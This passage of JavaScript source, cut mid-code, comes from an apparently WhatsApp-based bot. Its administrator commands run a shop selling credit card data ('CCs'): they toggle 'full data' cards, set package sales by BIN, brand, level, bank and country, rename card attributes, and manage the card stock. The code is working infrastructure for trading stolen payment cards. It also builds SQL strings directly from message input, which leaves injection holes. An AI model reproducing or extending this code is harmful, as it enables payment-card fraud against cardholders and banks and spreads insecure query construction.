                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'FULLDADOS'`).run()
                Texto = `*OPÇÃO DE CC FULL DESABILITADA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/modevendaunidade===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            if (msg[1] === "1") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'MODO_VENDA_UNIDADE'`).run()
                Texto = `*MODO DE VENDA DE UNIDADE MONSTRARÁ APENAS A OPÇÃO UNIDADE NAS CCS.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (msg[1] === "2") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '2' WHERE PARAMETRO = 'MODO_VENDA_UNIDADE'`).run()
                Texto = `*MODO DE VENDA DE UNIDADE MONSTRARÁ VÁRIAS OPÇÕES DE UNITÁRIAS NAS CCS.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Texto.indexOf("/venderpacotes") > -1 && Mensagem_Texto.indexOf("===") > -1) && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            if (Mensagem_Texto.indexOf("mix") > -1) {
                COLUNA = "MIX"
            }
            if (Mensagem_Texto.indexOf("nivel") > -1) {
                COLUNA = "NIVEL"
            }
            if (Mensagem_Texto.indexOf("bandeira") > -1) {
                COLUNA = "BANDEIRA"
            }
            if (Mensagem_Texto.indexOf("pais") > -1) {
                COLUNA = "PAIS"
            }
            if (Mensagem_Texto.indexOf("banco") > -1) {
                COLUNA = "BANCO"
            }
            if (Mensagem_Texto.indexOf("bin") > -1) {
                COLUNA = "BIN"
            }
            if (Mensagem_Texto.indexOf("full") > -1) {
                Full = "_FULL"
            } else {
                Full = ""
            }

            if (msg[1] === "0") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'VENDER_PACOTE_${COLUNA}${Full}'`).run()
                Texto = `*ESTE BOT NÃO VENDERÁ PACOTE DE CC TIPO: ${COLUNA}.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (msg[1] === "1") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'VENDER_PACOTE_${COLUNA}${Full}'`).run()
                Texto = `*ESTE BOT TERÁ OPÇÃO DE PACOTE CC TIPO: ${COLUNA}.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/nomebin") > -1 && Adms.includes(Numero)) {
            try {

                if (Mensagem_Texto.indexOf("bandeira") > -1) {
                    NOME_PARAMENTRO_PERSONALIZAR = "BANDEIRA"
                } else if (Mensagem_Texto.indexOf("nivel") > -1) {
                    NOME_PARAMENTRO_PERSONALIZAR = "NIVEL"
                } else if (Mensagem_Texto.indexOf("banco") > -1) {
                    NOME_PARAMENTRO_PERSONALIZAR = "BANCO"
                } else if (Mensagem_Texto.indexOf("pais") > -1) {
                    NOME_PARAMENTRO_PERSONALIZAR = "PAIS"
                } else {
                    Texto = `Comando inválido!`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }

                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 6) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                BIN = msg[1]
                NOVO_NOME = msg[2].toString().toUpperCase().replace(/[^a-zA-Z\s]/igm, '')

                await DataBase_Better.prepare(`INSERT INTO CCs_PRECOS_BIN (BIN) VALUES ('${BIN}') ON CONFLICT DO NOTHING`).run()
                await DataBase_Better.prepare(`INSERT INTO BININFO_BIN (BIN,PARAMETRO,NOME) VALUES ('${BIN}','${NOME_PARAMENTRO_PERSONALIZAR}','${NOVO_NOME}')`).run()

                Texto = `🛠️ AGORA, QUANDO ABASTECER UMA CC DA BIN *${BIN}*, O BOT VAI TROCAR O NOME DO(A) ${NOME_PARAMENTRO_PERSONALIZAR} PARA *${NOVO_NOME}*.

AS QUE JÁ ESTÃO NO ESTOQUE, NÃO ALTEREI, CASO QUEIRA QUE SE ENQUADREM NO NOVO AJUSTE, BASTA BAIXAR O ESTOQUE, DELETAR TUDO E REABASTECER.


◎ ══════ ❈ ══════ ◎
*BAIXE TODAS AS CCS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/baixarestoqueccs
/baixarestoqueccsfull (Full Dados)

◎ ══════ ❈ ══════ ◎
*DELETE TODAS AS CCS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/deletarestoqueccs
/deletarestoqueccsfull (Full Dados)
┕━━━━╗✹╔━━━━┙`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Algo deu errado...`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto === "/listarbinspersonalizadas" && Adms.includes(Numero)) {

            db = new sqlite3.Database(Diretorio_SQLITE_Principal, async (error) => {
                Array_Montando = []
                SQL = `SELECT _rowid_,* FROM BININFO_BIN`
                Array_Montando.push(`*LISTA BINS PERSONALIZADAS*`)
                Array_Montando.push("")

                db.each(SQL, async (err, Linha) => {
                    BIN = Linha["BIN"]
                    PARAMETRO = Linha["PARAMETRO"]
                    NOME = Linha["NOME"]
                    Array_Montando.push(`BIN: *${BIN}* = ${PARAMETRO} DELA VIRA *${NOME}*`)
                    Array_Montando.push("")

                }, async () => {
                    Texto = `${Array_Montando.join("\n")}`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                })
            })
            return;
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto === "/delbinspersonalizadas" && Adms.includes(Numero)) {

            await DataBase_Better.prepare(`DELETE FROM BININFO_BIN`).run();
            Texto = `Lista de Bins personalizadas deletada com sucesso!`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/persobandeiranivel===") > -1 && Adms.includes(Numero)) {
            try {

                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 6) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                CONTEM_PARAM = msg[1]
                NOVO_NOME_PARAM = msg[2].toString().toUpperCase().replace(/[^a-zA-Z\s]/igm, '')

